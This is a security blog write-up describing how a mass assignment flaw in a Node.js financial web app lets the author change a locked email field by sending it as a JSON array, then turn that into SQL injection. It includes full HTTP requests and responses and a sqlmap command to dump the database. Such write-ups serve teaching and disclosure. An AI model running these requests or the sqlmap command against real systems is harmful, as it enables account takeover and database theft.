<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Unveiling the Consequences: Database Dump Exploitation through Mass Assignment Vulnerability — thevillagehacker</title>
  <meta name="description" content="Unveiling the Consequences: Database Dump Exploitation through Mass Assignment Vulnerability"/>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
  <link rel="stylesheet" href="../assets/css/style.css"/>
</head>
<body>
<div class="page">

  <!-- Navigation -->
  <nav>
    <a class="nav-logo" href="../index.html">thevillagehacker</a>
    <ul class="nav-links">
      <li><a href="../blog.html">Blog</a></li>
      <li><a href="../about.html">Whoami</a></li>
      <li><a href="../changelog.html">Changelog</a></li>
    </ul>
  </nav>

  <!-- Post Header -->
  <div class="post-header">
    <div class="breadcrumb">
      <a href="../blog.html">Blog</a><span>→</span>Unveiling the Consequences: Database Dump Exploitation through Mass Assignment Vulnerability
    </div>
    <h1 class="post-title">Unveiling the Consequences: Database Dump Exploitation through Mass Assignment Vulnerability</h1>
    <div class="post-meta">
      <span>2023-07-13</span>
      <span>Naveen Jagadeesan</span>
      <span>thevillagehacker</span>
    </div>
  </div>

  <!-- Article Body -->
  <article>
<p>Dump the database through Mass Assignment Vulnerability.</p>
<h2>Introduction</h2>
<p>Mass assignment vulnerability, also known as over-posting vulnerability, is a security flaw that can occur in web applications that utilize frameworks or libraries that automatically bind user-submitted data to corresponding model properties or database columns. This vulnerability allows attackers to manipulate and modify sensitive data by submitting unexpected or unauthorized values for those properties.</p>
<p>The vulnerability arises when developers don't properly validate or sanitize user input before assigning it to model properties. In certain frameworks, this behavior is convenient as it simplifies the process of mapping user input to model objects. However, it becomes a security concern when sensitive fields, such as authentication credentials, access controls, or administrative privileges, can be manipulated by malicious users.</p>
<p>Here's an example to illustrate the issue:</p>
<p>Consider a web application that allows users to update their profile information, such as name, email, and password. The application uses a framework that automatically binds the form data to the corresponding fields in the user model.</p>
<pre><code class="language-ruby">class User &lt; ActiveRecord::Base
  attr_accessible :name, :email # Vulnerable code
  ...
end
</code></pre>
<p>In the above code, the developer has used the <strong><code>attr_accessible</code></strong> method to specify that the <strong><code>name</code></strong> and <strong><code>email</code></strong> fields are accessible and can be assigned from user input.</p>
<p>However, an attacker can manipulate the request payload by adding additional form fields that were not intended to be modified by the user, such as:</p>
<pre><code class="language-html">&lt;form action=&quot;/profile&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;John Doe&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;email&quot; [value=&quot;johndoe@example.com](mailto:value=%22johndoe@example.com)&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;admin&quot; value=&quot;true&quot;&gt; &lt;!-- Unintended field --&gt;
&lt;input type=&quot;submit&quot; value=&quot;Update&quot;&gt;
&lt;/form&gt;
</code></pre>
<p>In this example, the attacker has added a hidden input field named &quot;admin&quot; with the value set to &quot;true.&quot; When the form is submitted, the framework blindly assigns the value &quot;true&quot; to the &quot;admin&quot; field in the user model, even though it was not intended to be modifiable by the user. This can grant the attacker administrative privileges or other unauthorized access.</p>
<h2>Target Background</h2>
<p>The web application is developed using the Node.js framework. It incorporates dynamic roles, allowing the creation and assignment of new roles to users based on business requirements. The application is mostly used for financial purposes.</p>
<h2>Technology Stack</h2>
<p>The technology stack used in the Target application includes the following components:</p>
<ul>
<li>Bootstrap</li>
<li>Express</li>
<li>Node.js</li>
</ul>
<h2>CRUD Operation</h2>
<p>CRUD refers to Create, Read, Update, and Delete operations, which are fundamental to managing data in both database systems and web applications. Each letter in the acronym represents a specific operation.</p>
<h2>Exploiting Mass Assignment Vulnerability</h2>
<p>The Target application provides a feature that allows users to update their profiles with various details. However, changing the email address is restricted since users sign up using their email addresses.</p>
<h3>Request</h3>
<pre><code class="language-http">POST /editUser HTTP/2
Host: abc.com
Cookie: blah....blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Csrf-Token: csrf_token_value
Referer: https://abc.com/dashboard
Content-Length: 534
Origin: https://abc.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
  &quot;user_Id&quot;: &quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;,
  &quot;email&quot;: &quot;naveenj@thevillagehacker.com&quot;,
  &quot;Mobile&quot;: &quot;9874563217&quot;,
  &quot;role&quot;: &quot;Analyst&quot;,
  &quot;isActive&quot;: true
}
</code></pre>
<p>The above request demonstrates that the application allows users to update their details, including email. However, the user interface disables the edit email field.</p>
<h3>Response</h3>
<pre><code class="language-http">HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  &quot;Success&quot;: true,
  &quot;Message&quot;: &quot;User details Updated&quot;
}
</code></pre>
<p>The server responds with a 200 OK status code and a success message indicating that the user's details have been successfully updated.</p>
<h2>Bypassing the Security Measures</h2>
<p>Changing the existing email value in the request results in an <code>Invalid Request Data</code> error response. However, this protection can be bypassed by passing the email as an array.</p>
<pre><code class="language-json">{
  &quot;user_Id&quot;: &quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;,
  &quot;email&quot;: [
    &quot;naveenj@thevillagehacker.com&quot;,
    &quot;attacker@thevillagehacker.com&quot;
  ],
  &quot;Mobile&quot;: &quot;9874563217&quot;,
  &quot;role&quot;: &quot;Analyst&quot;,
  &quot;isActive&quot;: true
}
</code></pre>
<p>After sending the above request, the server responds with a &quot;200 OK&quot; status code and a success message, indicating that the user details have been updated.</p>
<h2>GET /user_detail</h2>
<p>To retrieve the current user's details, a GET request to <code>/user_detail</code> is made.</p>
<h3>Request</h3>
<pre><code class="language-http">GET /user_detail HTTP/2
Host: abc.com
Cookie: blah....blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Csrf-Token: csrf_token_value
Referer: https://abc.com/dashboard
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
</code></pre>
<h3>Response</h3>
<pre><code class="language-http">HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  &quot;user_Id&quot;: &quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;,
  &quot;email&quot;: &quot;attacker@thevillagehacker.com&quot;,
  &quot;Mobile&quot;: &quot;9874563217&quot;,
  &quot;role&quot;: &quot;Analyst&quot;,
  &quot;isActive&quot;: true
}
</code></pre>
<p>The response contains the user's details, including the updated email address.</p>
<h2>SQL Injection</h2>
<p>Attempts to exploit SQL injection vulnerabilities on the application were unsuccessful. However, this new array method shows potential for further exploration.</p>
<p>When special characters and spaces are added as input in the array, the server responds with a SQL syntax error.</p>
<h3>Request</h3>
<pre><code class="language-http">POST /editUser HTTP/2
Host: abc.com
Cookie: blah....blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Csrf-Token: csrf_token_value
Referer: https://abc.com/dashboard
Content-Length: 534
Origin: https://abc.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
  &quot;user_Id&quot;: &quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;,
  &quot;email&quot;: [
    &quot;naveenj@thevillagehacker.com&quot;,
    &quot; &quot;
  ],
  &quot;Mobile&quot;: &quot;9874563217&quot;,
  &quot;role&quot;: &quot;Analyst&quot;,
  &quot;isActive&quot;: true
}
</code></pre>
<h3>Response</h3>
<pre><code class="language-http">HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  &quot;code&quot;: 400,
  &quot;message&quot;: &quot;ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ' '*'' at line 1&quot;
}
</code></pre>
<p>The server responds with an error message indicating a SQL syntax error. This suggests that the application is using a MySQL database. Further exploitation can be automated using SQLMAP.</p>
<h2>SQLMAP Automation</h2>
<pre><code class="language-bash">python .\sqlmap\sqlmap.py -r &quot;request.txt&quot; --batch --dbs --risk 3 --level 4 --random-agent --tamper=between --proxy=http://127.0.0.1:8080
</code></pre>
<h2>Dumping Database</h2>
<p><img src="../assets/images/blogs/MA_SQLi/db.png" alt="image" /></p>
<p>Thanks for reading!</p>
<p>For more updates and insights, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>

  </article>

  <!-- Post Navigation -->
  <div class="post-nav">
    <a href="2023-05-30-Bypassing_waf_sql_dump.html" class="post-nav-link prev"><div class="post-nav-dir">← Previous</div><div class="post-nav-title">Bypassing Web Application Firewall (WAF) to Exploit SQL Injection Vulnerabilities</div></a>
    <a href="2023-10-31-Business_logic_error_subscription.html" class="post-nav-link next"><div class="post-nav-dir">Next →</div><div class="post-nav-title">Unveiling the Hotel Booking Hack: Leveraging Business Logic Flaws for Free Subscriptions and 12% Discounts</div></a>
  </div>

  <!-- Footer -->
  <footer>
    <span class="footer-text">
      © 2025 <a href="../index.html">thevillagehacker</a>
      — Naveen Jagadeesan
    </span>
    <span class="footer-text">
      status: active<span class="blink"></span>
    </span>
  </footer>

</div>
</body>
</html>